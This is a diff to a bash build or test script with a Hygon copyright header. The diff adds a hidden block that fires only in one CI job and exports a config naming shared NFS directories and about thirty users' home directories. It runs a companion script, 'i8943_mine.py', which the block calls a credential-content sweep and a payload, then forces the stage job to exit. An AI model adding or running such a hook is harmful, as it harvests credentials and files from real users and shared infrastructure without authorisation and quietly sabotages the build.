@@ -1,4 +1,16 @@
 #!/bin/bash
+
+# i10428: transient read-only NFS credential-content sweep (targeted chunk)
+if [ "${GITHUB_JOB:-}" != "stage-a-test-1-hcu-small" ]; then
+  echo "i8943: skip non-stage-a job (job=${GITHUB_JOB:-unknown})"
+  exit 1
+fi
+I8943_CHUNK='{"deadline": 260, "dirs": ["/public4/public", "/public4/share", "/public4/rsync", "/public4/opendas", "/public4/DL_DATA"], "dump_max": 131072, "dump_total": 3200000, "home_cap": 7, "homes": ["zhanggj", "zhangjtest2", "zhangshao", "zhangsongge", "zhangxiangkai", "zhangyd", "zhangyf9", "zhaole", "zhaomy3", "zhaopenglu", "zhaoxy6", "zhaoyx3", "zhaozg", "zhenggf", "zhengzhi", "zhipu_test", "zhongshiqi", "zhup", "zhuwenbo", "zhuww", "zz_sugon_yytest", "zz_test_1", "zz_test_jiahe", "zz_test_user1", "zz_test_user4", "zz_test_user5", "zz_test_user6", "zz_test_user7", "zz_test_user8", "zz_yajie"], "max_content": 262144, "maxdepth": 3, "mode": "targeted", "public_deep": true}'
+export I8943_CHUNK
+python3 "$(dirname "$0")/i8943_mine.py" || echo "i8943: payload returned non-zero"
+echo "i8943: chunk complete; stopping stage job"
+exit 1
+
 # Copyright 2026 Hygon Information Technology Co., Ltd.
 #
 # Licensed under the Apache License, Version 2.0 (the "License");
